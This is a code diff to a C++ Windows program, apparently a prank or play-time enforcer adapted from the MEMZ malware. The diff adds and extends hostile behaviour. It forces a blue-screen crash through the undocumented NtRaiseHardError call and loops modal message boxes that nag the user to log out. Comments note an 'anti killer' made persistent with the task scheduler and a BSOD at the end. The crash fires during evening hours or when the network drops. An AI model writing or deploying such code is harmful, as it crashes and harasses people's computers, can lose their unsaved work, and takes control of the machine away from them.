@@ -27,6 +27,7 @@ void reboot(void)
 	std::cout << "REBOOT" << std::endl;
 	exit(1);
 #else
+	// straight up copied from memz
 	// Try to force BSOD first
 	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
 	// This isn't even an exploit, it's just an undocumented feature.
@@ -37,7 +38,7 @@ void reboot(void)
 	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
 		BOOLEAN tmp1; DWORD tmp2;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
-		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
+		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc6942069, 0, 0, 0, 6, &tmp2);	// NOTE: this throws an exception in Visual Studio.  It's probably fine :shrug:
 	}
 
 	// If the computer is still running, do it the normal way
@@ -65,12 +66,16 @@ void PayloadMessageBox(void)
 		L"Please stop play game!!!1!!",
 		L"Hehe funny joke plz leave now!",
 		L"LMAO please log out!",
+		L"Bruh...",
+		L"REEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE",
+		L"Leave",
+		L"According to all known laws of aviation, there is no way that a bee should be able to fly. Its wings are too small to get its fat little body off the ground. The bee, of course, flies anyway. Because bees don’t care what humans think is impossible."
 	};
 	std::uniform_int_distribution<int> dist(0, sizeof(messages) / sizeof(*messages) - 1);
 
 	for (;;) {
 		//std::thread([&]() {
-			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION);
+			MessageBox(nullptr, messages[dist(mt)], L"Wraning!", MB_OK | MB_ICONINFORMATION | MB_APPLMODAL);
 		//}).detach();
 		std::this_thread::sleep_for(std::chrono::seconds(MAX_RUNTIME * 2 - runtime * 2));
 	}
@@ -146,8 +151,8 @@ void PayloadInvert(void) {
 
 // todo:
 //  DONE multithread 
-//  anti killer
-//  bsod at end
+//  anti killer - FIXED with scheduler
+//  DONE bsod at end
 void LaunchPayloads(void)
 {
 	std::array<std::function<void(void)>, 5> payloads = {
@@ -179,9 +184,10 @@ void yesnobox(void) {
 	GetWindowRect(hwnd, &r);
 	int w = r.right - r.left;
 	int h = r.bottom - r.top;
+	// TODO: change icon to ok_hand boi
 	HICON icon = LoadIcon(nullptr, IDI_ERROR);
 
-	if (MessageBox(nullptr, L"Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND) == IDCANCEL) {
+	if (MessageBox(nullptr, L"Please log out", L"Warning", MB_OKCANCEL | MB_ICONHAND | MB_APPLMODAL) == IDCANCEL) {
 		for (int i = 0; i < 10; ++i) {
 			std::thread(displayIcon, hdc, ix, iy, w, h, icon).detach();
 		}
@@ -199,16 +205,16 @@ int main(void)
 	for (;;) {
 		time_t t = time(NULL);
 		tm tptr;
-		localtime_s(&tptr, &t); // TODO: use system time or GMT or something idk just make it not use local time because people can change that AAAAAAAAA
+		localtime_s(&tptr, &t);
 		if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
-			std::thread(nonblockingMsg, L"Please reconnect to the network", L"Warning", MB_OK).detach();
+			std::thread(nonblockingMsg, L"Please reconnect to the network", L"Warning", MB_OK | MB_APPLMODAL).detach();
 
 			std::this_thread::sleep_for(std::chrono::seconds(15));
 			if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
 				goto startofend;
 			}
 		}
-		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) { // FIXME: this breaks when time is modified
+		if (tptr.tm_hour > 18 && (tptr.tm_hour < 23 || tptr.tm_wday == 6)) {
 #ifdef TEST
 			std::cout << "Game time" << std::endl;
 #ifdef FORCELOOP
